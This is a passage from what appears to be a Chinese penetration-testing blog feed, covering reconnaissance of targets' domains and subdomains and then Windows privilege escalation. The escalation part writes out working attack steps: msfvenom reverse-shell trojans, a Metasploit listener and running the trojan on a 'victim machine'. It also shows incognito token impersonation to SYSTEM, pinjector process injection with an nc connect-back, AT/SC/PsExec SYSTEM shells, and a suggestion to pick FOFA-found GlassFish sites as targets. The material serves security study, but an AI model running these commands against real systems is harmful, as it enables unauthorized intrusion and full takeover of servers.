href="https://github.com/wgpsec/ENScan_GO">https://github.com/wgpsec/ENScan_GO</a></p><p>一款基于各大企业信息API的工具，解决在遇到的各种针对国内企业信息收集难题。一键收集控股公司ICP备案、APP、小程序、微信公众号等信息聚合导出。</p><h3 id="例子"><a class="markdownIt-Anchor" href="#例子"></a> 例子</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">网址：917hh.com</span><br><span class="line">注册商：Alibaba Cloud Computing (Beijing) Co.,Ltd.</span><br><span class="line">注册人：</span><br><span class="line">邮件：</span><br><span class="line">注册联系人电话：</span><br><span class="line">DNS服务器：dns15.hichina.com - 139.224.142.112dns16.hichina.com - 47.118.199.201</span><br></pre></td></tr></table></figure><h2 id="子域名"><a class="markdownIt-Anchor" href="#子域名"></a> 子域名</h2><h3 id="通过谷歌语法"><a class="markdownIt-Anchor" href="#通过谷歌语法"></a> 通过谷歌语法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">site:baidu.com -www</span><br></pre></td></tr></table></figure><h3 id="聚合网站"><a class="markdownIt-Anchor" href="#聚合网站"></a> 聚合网站</h3><p>GUI好看，结果多：<a href="https://securitytrails.com">https://securitytrails.com</a></p><p>这个网站能查很多东西，包括whois，还有子域名，很厉害：<a href="https://www.virustotal.com/gui/home/search">https://www.virustotal.com/gui/home/search</a></p><p>这个网站能查的好像就少一些，所以一般用上面的吧：<a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></p><h3 id="ssl证书"><a class="markdownIt-Anchor" href="#ssl证书"></a> SSL证书</h3><p>SSL证书是需要申请的，用来保证用户与网站之间的通信。一个SSL/TLS证书通常包含域名、子域名和邮件地址，查找一个域名证书的最简单方法是使用搜索引擎来收集计算机的CT日志，并让任何搜索引擎搜索它们。前两种比较常用。</p><blockquote><p>证书透明性（Certificate Transparency，CT）是 Google 的公开项目，通过让域所有者、CA 和域用户对 SSL 证书的发行和存在进行审查，来纠正这些基于证书的威胁</p></blockquote><ol><li><a href="https://crt.sh/">https://crt.sh/</a></li><li><a href="https://censys.io/">https://censys.io/</a></li></ol><h3 id="爆破枚举"><a class="markdownIt-Anchor" href="#爆破枚举"></a> 爆破枚举</h3><p>这个就有很多工具可以用了，大佬们都有自己用的顺手的工具，比较常见的是：</p><blockquote><ol><li>layer子域名挖掘机</li><li>subDomainsBrute</li><li>K8</li><li>orangescan</li><li>DNSRecon</li><li>在线zcjun：<a href="http://z.zcjun.com/">http://z.zcjun.com/</a></li></ol></blockquote><p>这里重点推荐 layaer 和 subDomainsBrute 工具，可以从子域名入侵到主站。</p><p>小技巧：在<a href="https://github.com/">https://github.com/</a> 上也可以搜索子域名，运气好的话，会有意想不到的收获。例如：<a href="https://github.com/search?q=subdomain+baidu.com&amp;type=code">https://github.com/search?q=subdomain+baidu.com&amp;type=code</a></p><h3 id="dns公开数据集"><a class="markdownIt-Anchor" href="#dns公开数据集"></a> DNS公开数据集</h3><p>利用已有公开的扫描数据集，对子域名信息进行收集。</p><blockquote><p><a href="https://opendata.rapid7.com/">https://opendata.rapid7.com/</a></p></blockquote><h3 id="dns共享记录查询"><a class="markdownIt-Anchor" href="#dns共享记录查询"></a> DNS共享记录查询</h3><p>原理：查询共享DNS服务器主机来获取相关的域名</p><ol><li><p>首先查询是否存在NS服务器（这个服务器记录了遇到域名应该去哪里的DNS解析）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup -query=ns baidu.com</span><br></pre></td></tr></table></figure></li><li><p>将非权威应答中的NS服务器带到下面的网站查询</p><p><a href="https://hackertarget.com/find-shared-dns-servers/">https://hackertarget.com/find-shared-dns-servers/</a></p></li></ol><h3 id="子域名爆破泛解析问题"><a class="markdownIt-Anchor" href="#子域名爆破泛解析问题"></a> 子域名爆破泛解析问题</h3><p>利用通配符* （星号）来做次级域名以实现所有的次级域名均指向同一IP地址。在域名前添加任何子域名，均可访问到所指向的IP地址。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">常规域名解析</span><br><span class="line">www.wolke.cn   10.10.10.10</span><br><span class="line"></span><br><span class="line">域名泛解析</span><br><span class="line">*.wolke.cn     10.10.10.10</span><br><span class="line">访问子域名a.wolke.cn，b.wolke.cn等均指向10.10.10.10</span><br></pre></td></tr></table></figure><p>这为我们去做子域名爆破带来了极大的不便，以前子域名爆破常用的是layer子域名挖掘机。不过layer子域名挖掘机在跑具有泛解析的站的时候，就不是那么适用。</p><p>换句话说：<strong>所有子域名都有效，但是其实不是的。</strong></p><p><img src="/images/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/v2-32e0407165ef91e68b36461382f8840e_720w.jpg" alt="子域名爆破的泛解析问题" /></p><h4 id="判断是否泛解析"><a class="markdownIt-Anchor" href="#判断是否泛解析"></a> 判断是否泛解析</h4><ol><li>ping一个不可能存在子域名，看能不能到达</li></ol><p>解决：</p><p>比如开源工具oneforall会首先访问一个随机的并不存在的域，通过返回结果判断是否存在泛解析，确定存在泛解析以后，<strong>程序会开始不断的循环产生随机域名，去向服务器查询，将每次查询到的IP和TTL记录下来，直到大部分的IP地址出现次数都大于两次，则IP黑名单的收集结束</strong>，在得到了IP黑名单以后，oneforall接下来会将自己的字典中的每一项和要指定查询的域名进行拼接。在爆破过程中根据IP黑名单进行过滤。但这种宽泛的过滤容易导致漏报，所以oneforall将 TTL 也作为黑名单规则的一部分，评判的依据是：<strong>在权威 DNS 中，泛解析记录的 TTL 肯定是相同的，如果子域名记录相同，但 TTL 不同，那这条记录可以说肯定不是泛解析记录</strong></p><p>参考：<a href="https://security.tencent.com/index.php/blog/msg/161">https://security.tencent.com/index.php/blog/msg/161</a></p><h2 id="某个域名的ip端口业务信息等"><a class="markdownIt-Anchor" href="#某个域名的ip端口业务信息等"></a> 某个域名的IP，端口，业务信息等</h2><h3 id="应用中的信息"><a class="markdownIt-Anchor" href="#应用中的信息"></a> 应用中的信息</h3><h4 id="微信支付宝小程序"><a class="markdownIt-Anchor" href="#微信支付宝小程序"></a> 微信/支付宝小程序</h4><h4 id="微信公众号"><a class="markdownIt-Anchor" href="#微信公众号"></a> 微信公众号</h4><h4 id="手机app抓包历史版本"><a class="markdownIt-Anchor" href="#手机app抓包历史版本"></a> 手机APP抓包+历史版本</h4><ol><li>APP 提取一键反编译提取</li><li>APP 抓数据包进行工具配合</li><li>各种第三方应用相关探针技术</li><li>各种服务接口信息相关探针技术</li></ol><p><strong>ApkAnalyser-Apk数据提取</strong>，需要提取的apk文件放在apps文件夹内，直接运行apkAnalyser.exe</p><p>提取出来的文件会在result中。urls一般有文件的url链接！还可以利用 burp 历史抓更多 URL！</p><img src="/images/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/image-20230707160531536.png" alt="image-20230707160531536" style="zoom:50%;" /><h1 id="其他"><a class="markdownIt-Anchor" href="#其他"></a> 其他</h1><ol><li>可以写脚本用来爬取 fofa 上的IP和域名数据</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概述&quot;&gt;&lt;/a&gt; 概述&lt;/h1&gt;
&lt;p&gt;在信息收集阶段，我们需要尽量多的收集关于目标web应用的各种信息，比如：脚本语言的类型、服务器的类型、目录的结构、使用的开源软件、数据库类型、所</summary>
      
    
    
    
    <category term="渗透测试基础" scheme="https://j3f5.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="整体流程" scheme="https://j3f5.github.io/tags/%E6%95%B4%E4%BD%93%E6%B5%81%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>权限提升</title>
    <link href="https://j3f5.github.io/articles/2023/06/14/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
    <id>https://j3f5.github.io/articles/2023/06/14/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</id>
    <published>2023-06-14T02:42:23.000Z</published>
    <updated>2023-06-29T02:42:23.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a class="markdownIt-Anchor" href="#前言"></a> 前言</h1><p>一般渗透流程就是获取webshell权限、获取其他应用权限，然后提权获取服务器系统管理员权限，获取system/root权限。这里主要是思路的体现。</p><p><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87.png" alt="权限提升" /></p><h2 id="相关注意点"><a class="markdownIt-Anchor" href="#相关注意点"></a> 相关注意点</h2><ol><li>前期-中期-后期对应知识关系</li><li>知识点顺序，理解思路，分类介绍等</li><li><strong>注重理解当前权限对应可操作的事情</strong></li><li>相关的操作被拒绝无法实现的时候就会涉及到权限提升</li></ol><h2 id="权限分类"><a class="markdownIt-Anchor" href="#权限分类"></a> 权限分类</h2><p><strong>后台权限</strong></p><ol><li>获得方式：<strong>爆破，注入猜解，弱口令</strong>等获取的帐号密码配合登录</li><li>一般网站或应用后台只能操作应用的界面内容数据图片等信息，无法操作程序的源代码或服务器上的资源文件的。（如后台功能存在文件操作的话也可以操作文件数据）</li></ol><p><strong>网站权限</strong></p><ol><li>获得方式：<strong>爆破，注入猜解，弱口令</strong>等获取的帐号密码配合登录</li><li>查看或修改程序源代码，可以进行网站或应用的配置文件读取（<strong>接口配置信息，数据库配置信息等</strong>），还能收集服务器操作系统相关的信息，为后续系统提权做准备。</li></ol><p><strong>数据库权限</strong></p><p>操作数据库的权限，数据库的增删改等，源码或配置文件泄漏，也可能是网站权限(webshell)进行的数据库配置文件读取获得。</p><p><strong>接口权限</strong></p><p>邮件，短信，支付，第三方登录等，一旦截获，我们就可以利用这个接口对他人进行攻击。</p><p><strong>系统权限</strong></p><p><strong>域控权限</strong></p><blockquote><p>后台或网站权限后的获取途径：后台（修改配置信息功能点），网站权限（查看的配置文件获取），具体可以操作的事情大家自己想想。</p></blockquote><h1 id="webshell"><a class="markdownIt-Anchor" href="#webshell"></a> Webshell</h1><h2 id="获得权限的思路"><a class="markdownIt-Anchor" href="#获得权限的思路"></a> 获得权限的思路</h2><ol><li>寻找网站特征，判断cms，查找历史漏洞</li><li>若判断不了，搜集信息，搜集配置文件与源码，审计功能点</li><li>查找功能点，看有没有getshell的可能<ol><li>上传</li><li>sql注入</li><li>RCE等等</li></ol></li></ol><h2 id="某挂壁程序后台权限提升-后台功能"><a class="markdownIt-Anchor" href="#某挂壁程序后台权限提升-后台功能"></a> 某挂壁程序后台权限提升-后台功能</h2><ul><li><strong>前提：已经获取了后台账号密码</strong>（获得方式：爆破，注入猜解，弱口令等获取的帐号密码配合登录 ）</li></ul><p>后台权限和网站权限不同，后台权限不能对网站代码的层次进行修改</p><p>分析网站的CMS，</p><ul><li><p><strong>已知cms</strong></p><ol><li>在网上搜索CMS对应的漏洞，尝试复现。</li><li>网上未能找到相应版本漏洞，下载网站源码，进行代码审计，进行分析，寻找可以提权的漏洞</li><li>用功能点配合网站源码进行测试，在上传点抓包找到对应的代码</li></ol></li><li><p><strong>未知cms</strong></p><p>没有代码：直接常规测试，测试围绕文件上传、模板修改、SQL执行、数据备份等功能</p></li></ul><h2 id="某-bc-广告导航页权限提升-漏洞层面"><a class="markdownIt-Anchor" href="#某-bc-广告导航页权限提升-漏洞层面"></a> 某 BC 广告导航页权限提升-漏洞层面</h2><p>信息收集，发现中间件有漏洞</p><p>抓包了解网站使用的Apache和OpenSSL版本，凭借经验发现是基于PHPstudy的网站。根据网络资料<strong>复现PHPstudy的后门漏洞</strong>，实现命令执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Apache 2.4.** Mysql 5.*** PHP 5.***</span><br></pre></td></tr></table></figure><h2 id="glassfish-中间件-第三方"><a class="markdownIt-Anchor" href="#glassfish-中间件-第三方"></a> GlassFish 中间件-第三方</h2><p>通过FOFA信息收集，搜索使用GlassFish的网站作为目标根据网络资料复现GlassFish的任意文件读取漏洞（注意使用条件是否匹配）获取敏感信息，进行下一步渗透</p><h1 id="服务器权限"><a class="markdownIt-Anchor" href="#服务器权限"></a> 服务器权限</h1><h2 id="win提权"><a class="markdownIt-Anchor" href="#win提权"></a> WIN提权</h2><h3 id="基础知识"><a class="markdownIt-Anchor" href="#基础知识"></a> 基础知识</h3><h4 id="权限划分"><a class="markdownIt-Anchor" href="#权限划分"></a> 权限划分</h4><p><strong>普通权限</strong></p><p>一般系统分为七个组，每个组有对应不同的操作权限。<strong>管理员组(Administrators)、高权限用户组(Power Users)、普通用户组(Users)、身份验证用户组(Ahthenticated users)、来宾用户组(Guests)</strong>、<em>文件复制组(Replicator)、备份操作组(Backup Operators)</em></p><ul><li>管理员组拥有大部分的计算机操作权限(并不是全部)，能够随意修改删除所有文件和修改系统设置只有程序信任组（特殊权限）</li><li>来宾用户组的文件操作权限和普通用户组一样，但是无法执行更多的程序。</li><li>身份验证用户组(Ahthenticated users) 经过ms验证程序登录的用户均属于此组。</li></ul><p><strong>特殊权限</strong></p><p>出了上述，还有系统的特殊成员：<strong>SYSTEM(系统)、Trustedinstaller（信任程序模块）、Everyone(所有人)、CREATOR OWNER(创建者)</strong> 。这些特殊成员不被任何内置用户组吸纳，属于完全独立出来的账户。</p><ul><li>真正拥有“完全访问权”的只有一个成员:SYSTEM</li></ul><h4 id="基础命令"><a class="markdownIt-Anchor" href="#基础命令"></a> 基础命令</h4><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td><code>systeminfo</code></td><td>打印系统信息</td></tr><tr><td><code>whoami</code></td><td>获得当前用户名</td></tr><tr><td><code>whoami /priv</code></td><td>当前账户权限</td></tr><tr><td><code>ipconfig</code></td><td>网络配置信息</td></tr><tr><td><code>ipconfig /displaydns</code></td><td>显示DNS缓存</td></tr><tr><td><code>route print</code></td><td>打印出路由表</td></tr><tr><td><code>arp -a</code></td><td>打印arp表</td></tr><tr><td><code>hostname</code></td><td>主机名</td></tr><tr><td><code>net user</code></td><td>列出用户</td></tr><tr><td><code>net user &lt;UserName&gt;</code></td><td>关于用户的信息</td></tr><tr><td><code>net use \SMBPATHPa$$w0rd/u:UserName</code></td><td>连接SMB</td></tr><tr><td><code>net localgroup</code></td><td>列出所有组</td></tr><tr><td><code>net localgroup GROUP</code></td><td>关于指定组的信息</td></tr><tr><td><code>net view\127.0.0.1</code></td><td>会话打开到当前计算机</td></tr><tr><td><code>net session</code></td><td>开放给其他机器</td></tr><tr><td><code>netsh firewall show config</code></td><td>显示防火墙配置</td></tr><tr><td><code>DRIVERQUERY</code></td><td>列出安装的驱动</td></tr><tr><td><code>Tasklist /svc</code></td><td>列出服务任务</td></tr><tr><td><code>net start</code></td><td>列出启动的服务</td></tr><tr><td><code>dir/s foo</code></td><td>在目录中搜索指定字符的项</td></tr><tr><td><code>dir/s too==bar</code></td><td>同上</td></tr><tr><td><code>sc query</code></td><td>列出所有服务</td></tr><tr><td><code>sc qc ServiceName</code></td><td>找到指定服务的路径</td></tr><tr><td><code>shutdown /r/t 0</code></td><td>立即重启</td></tr><tr><td><code>type file.txt</code></td><td>打印出内容</td></tr><tr><td><code>Icacls “C:\Example”</code></td><td>列出权限</td></tr><tr><td><code>wmic qfe getCaption, Description,HotFixID,InstalledOn</code></td><td>列出已安装的补丁</td></tr><tr><td><code>(NewObject System.Net.WebClient).DownloadFile( “https://host/file&quot;/&quot;C:\LocalPath&quot;)</code></td><td>利用ps远程下载文件到本地</td></tr><tr><td><code>accesschk. exe-qwsu&quot;Group&quot;</code></td><td>修改对象(尝试Everyone，Authenticated Users和/或users)</td></tr></tbody></table><h3 id="web-shell提权思路"><a class="markdownIt-Anchor" href="#web-shell提权思路"></a> WEB-shell提权思路</h3><ol><li><p>前提是获得web权限</p></li><li><p>判断是什么系统，是服务器（2012 2003等等）还是个人主机（xp win7/10），判断当前权限</p><p>一般使用<code>systeminfo</code>（打了啥补丁）、<code>whoami /priv</code>（能做啥操作）</p></li><li><p>判断是否存在补丁，验证未打的补丁是否有的是<strong>权限提升</strong>/bypass的。</p><p>使用脚本：<a href="https://github.com/zhzyker/vulmap">Vulmap</a>、<a href="https://github.com/bitsadmin/wesng">Wes</a>、<a href="https://github.com/chroblert/WindowsVulnScan">WindowsVulnScan</a>使用KBCollect.ps1</p><p>Wes和WindowsVulnScan是python脚本（自己的环境有就行）</p></li><li><p>辅助工具：</p><ul><li><a href="https://i.hacking8.com/tiquan/">https://i.hacking8.com/tiquan/</a></li></ul></li></ol><p>发现exp后，使用msf反弹shell连接即可。以上是web上的提权方法。如果看到的补丁是主机层面的提权，则需要以下思路。</p><p>至于为什么会有两种方法？例如本地提权，如果使用的是新建窗口进行提权的，那么在web并不适用，因为没办法连接到新的cmd。</p><h3 id="本地提权思路溢出漏洞atscps"><a class="markdownIt-Anchor" href="#本地提权思路溢出漏洞atscps"></a> 本地提权思路——溢出漏洞/AT/SC/PS</h3><p>溢出漏洞的使用，msf已经足够了解了。有些漏洞可能只适应于本地环境提权，不适用于web环境提权。有些提权方法借助系统上的设计，逻辑上的问题来实现，并不总是依靠漏洞。</p><p>前提已经获得计算机的普通用户权限，较老的计算机系统，视频以Win2003为例，参考：<a href="https://blog.csdn.net/weixin_40412037/article/details/121535553">windows权限提升——AT、SC、PS命令提权</a></p><h4 id="at"><a class="markdownIt-Anchor" href="#at"></a> AT</h4><p><strong>适用范围：只针对Win7及之前的系统，从Win8开始不再支持at命令。</strong></p><p>打开cmd添加一项计划任务，在15:13打开一个cmd窗口，发现打开的窗口是system权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">at 15:13 /interactive cmd.exe</span><br></pre></td></tr></table></figure><p>这是一个设计上的逻辑错误。<a href="https://blog.csdn.net/weixin_45677145/article/details/122061271?spm=1001.2101.3001.6650.1&amp;utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-1.pc_relevant_default&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~default-1.pc_relevant_default&amp;utm_relevant_index=2">Windows中使用命令创建计划任务（at、schtasks）</a></p><h4 id="sc"><a class="markdownIt-Anchor" href="#sc"></a> SC</h4><p><strong>适用范围：03/08、12/16</strong></p><p>创建一个名叫“syscmd”的服务，运行它，发现得到的cmd窗口是system权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc Create syscmd binPath= &quot;cmd /K start&quot; type= own type= interact</span><br><span class="line">sc start syscmd</span><br></pre></td></tr></table></figure><h4 id="ps"><a class="markdownIt-Anchor" href="#ps"></a> PS</h4><p><strong>适用范围：适用于Win2003 &amp; Win2008</strong></p><p>下载微软官方的<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools">PsTools</a>工具包，在下载的文件夹下执行下面的命令，发现得到的cmd窗口是system权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe -accepteula -s -i -d cmd.exe</span><br></pre></td></tr></table></figure><h4 id="溢出漏洞"><a class="markdownIt-Anchor" href="#溢出漏洞"></a> 溢出漏洞</h4><p>实战中最常用的本地溢出提权有 CVE-2018-8120、MS16-032、MS15-051 和 MS14-058 。</p><p>在MSF中，最常用的提权模块是CVE-2018-8120；</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br><span class="line">Wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KB4131188&quot;  #直接找是否存在cve-2018-8120对应的KB4131188补丁</span><br></pre></td></tr></table></figure><p>在CobaltStrike中，最常用的提权模块的是 MS14-058。这四个提权，都有对应的exe程序。exe程序均支持32和64位的机器。</p><p>通过找补丁，看是否有相应漏洞：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br><span class="line">Wmic qfe get Caption,Description,HotFixID,InstalledOn</span><br><span class="line">wmic qfe get Caption,Description,HotFixID,InstalledOn | findstr /C:&quot;KB4131188&quot; </span><br></pre></td></tr></table></figure><p>利用<code>post/windows/gather/enum_patches </code>模块 可以根据漏洞编号快速找出系统中缺少的补丁</p><p><a href="https://www.freebuf.com/articles/system/254836.html">https://www.freebuf.com/articles/system/254836.html</a></p><h3 id="令牌窃取及权限提升老"><a class="markdownIt-Anchor" href="#令牌窃取及权限提升老"></a> 令牌窃取及权限提升「老」</h3><p>主要发生在：windows2008 win7左右的系统，才能使用，现在应该就很少了。因为普通用户没办法通过令牌枚举来发现system或者administrator的令牌。所以没办法进行窃取。要发现这些令牌，可以使用烂土豆进行令牌模拟，这样就可以使用令牌窃取了。</p><p>一般都使用MSF进行令牌窃取，流程：</p><ol><li><p>在本地msf服务器上，执行以下命令，生成反弹shell木马</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=??? -f exe -o /root/xx.exe</span><br></pre></td></tr></table></figure></li><li><p>在本地msf服务器上执行以下命令，监听端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload  windows/meterpreter/reverse_tcp</span><br><span class="line">show options</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 6677</span><br><span class="line">show options</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></li><li><p>将该木马xx.exe，上传到远程目标服务器，并运行木马程序。</p></li><li><p>本地监听到会话，查看权限为普通用户xiaodi</p></li><li><p>提权：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use incognito</span><br><span class="line">list_tokens -u</span><br><span class="line">impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;</span><br></pre></td></tr></table></figure><p><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230621163747422.png" alt="image-20230621163747422" /></p></li></ol><h3 id="进程注入dll劫持老"><a class="markdownIt-Anchor" href="#进程注入dll劫持老"></a> 进程注入（DLL劫持）「老」</h3><p>Windows2003&amp;10 进程注入提升 进程注入提权是本地提权方式的一种较为老的安全技术了，<strong>利用的是注入进程的所有者实现权限共享机制</strong>，这类技术主要利用在 windows2008 之前操作系统上，所以我们需要学习后续的本地提权更多的手法才能有针对高版本的系统，因为是系统特性，所以不会被杀软拦截。</p><p><strong>pinjector 进程注入工具针对-win2008 以前操作系统</strong></p><ol><li><p>上传到目标机器</p></li><li><p>运行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pinjector.exe 　　　　　　//运行命令，查看用法</span><br><span class="line">pinjector.exe -l  //列出可注入的进程</span><br><span class="line">pinjector.exe -p 416 cmd.exe 6688 // pinjector.exe -p pid cmd.exe 6688　注入到系统正常的服务里，监听6688端口（后面是否为system权限）</span><br><span class="line">nc 192.168.131.111 6688 // 监听6688端口，成功反弹shell，成功提权</span><br></pre></td></tr></table></figure></li></ol><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625101836817.png" alt="image-20230625101836817" style="zoom: 50%;" /><p>绑定：通过使用命令将权限绑定至system权限的进程中，这里选在进程最好绑定系统进程，这样能够实现开机自启。</p><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625101908888.png" alt="image-20230625101908888" style="zoom:50%;" /><blockquote><p>其原理是：查看这个软件运行了什么dll，我们就替换这个dll，当程序启动的时候，就会自动调用这个dll达到提权（如果这个软件的运行权限是system）</p></blockquote><h3 id="烂土豆ms16-075配合令牌窃取提权"><a class="markdownIt-Anchor" href="#烂土豆ms16-075配合令牌窃取提权"></a> 烂土豆MS16-075配合令牌窃取提权</h3><p>单纯令牌窃取：适用于web权限或本地提权，如配合烂土豆提权：适用于web或数据库等权限，因为这些权限才有模拟令牌的权限。</p><p>如果可以模拟令牌就可以枚举诸如system的令牌，就可以使用令牌窃取达成权限提升。</p><h4 id="rottenpotato原理"><a class="markdownIt-Anchor" href="#rottenpotato原理"></a> RottenPotato原理</h4><p>RottenPotato（烂土豆）提权的<strong>原理</strong>可以简述如下：</p><ol><li>欺骗 “NT AUTHORITY\SYSTEM”账户通过NTLM认证到我们控制的TCP终端。</li><li>对这个认证过程使用中间人攻击（NTLM重放），为“NT AUTHORITY\SYSTEM”账户本地协商一个安全令牌。这个过程是通过一系列的Windows API调用实现的。</li><li>模仿这个令牌。只有具有“模仿安全令牌权限”的账户才能去模仿别人的令牌。一般大多数的服务型账户（IIS、MSSQL等）有这个权限，大多数用户级的账户没有这个权限。</li></ol><p>所以，一般从web拿到的webshell都是IIS服务器权限，是具有这个模仿权限的。测试过程中，我发现使用已经建好的账户（就是上面说的用户级账户）去反弹meterpreter然后再去执行EXP的时候会失败，但使用菜刀（IIS服务器权限）反弹meterpreter就会成功。即<strong>非服务类用户权限无法窃取成功。</strong></p><p>具体权限（<code>whoami /priv</code>）/要求为：</p><ol><li>需要支持SeImpersonate或者SeAssignPrimaryToken权限（用来模拟令牌）</li><li>注意RPC端口</li><li><a href="http://xn--49sq66hcqa154b.NET">需要安装.NET</a> Framework</li></ol><p>烂土豆比热土豆的优点是：</p><ol><li>100%可靠</li><li>（当时）全版本通杀。</li><li>立即生效，不用像hot potato那样有时候需要等<strong>Windows更新</strong>才能使用。</li></ol><p>总之，我对这个的理解是通过中间人攻击，将COM（NT\SYSTEM权限）在第二步挑战应答过程中认证的区块改成自己的区块获取SYSTEM令牌，然后利用msf的模仿令牌功能模仿SYSTEM令牌。</p><p>烂土豆下载资源</p><p><a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075">windows-kernel-exploits/MS16-075 at master · SecWiki/windows-kernel-exploits (github.com)</a></p><p><a href="https://github.com/foxglovesec/RottenPotato">foxglovesec/RottenPotato: RottenPotato local privilege escalation from service account to SYSTEM (github.com)</a></p><h4 id="烂土豆提权流程"><a class="markdownIt-Anchor" href="#烂土豆提权流程"></a> 烂土豆提权流程</h4><p><strong>上传烂土豆----------&gt;执行烂土豆----------&gt;利用窃取模块----------&gt;窃取SYSTEM----------&gt;成功</strong></p><ol><li><p><a href="https://www.cnblogs.com/tianlinlin/p/10171981.html">上传后门</a>，生成一个后门，并上传到目标服务器。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure></li><li><p>启动监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload  windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport 5577</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure></li><li><p>受害机执行后门</p><p><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230621171531434.png" alt="image-20230621171531434" /></p><p>确定当前为webshell权限。<code>getuid</code></p></li><li><p>单纯令牌窃取</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use incognito</span><br><span class="line">list_tokens -u</span><br><span class="line">impersonate_token <span class="string">&quot;NT AUTHORITY\SYSTEM&quot;</span></span><br></pre></td></tr></table></figure><p>提权失败，单纯用令牌窃取提权需要有一定的权限，这里的权限太低。</p><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625094704731.png" alt="image-20230625094704731" style="zoom:50%;" /></li><li><p>借助烂土豆提权</p><ol><li><p>上传potato.exe</p></li><li><p>在刚才的test的基础之上，再执行potato.exe</p><img src="/images/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/image-20230625094741213.png" alt="image-20230625094741213" style="zoom:80%;" /></li><li><p>执行即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> C:\\</span><br><span class="line">execute -cH -f 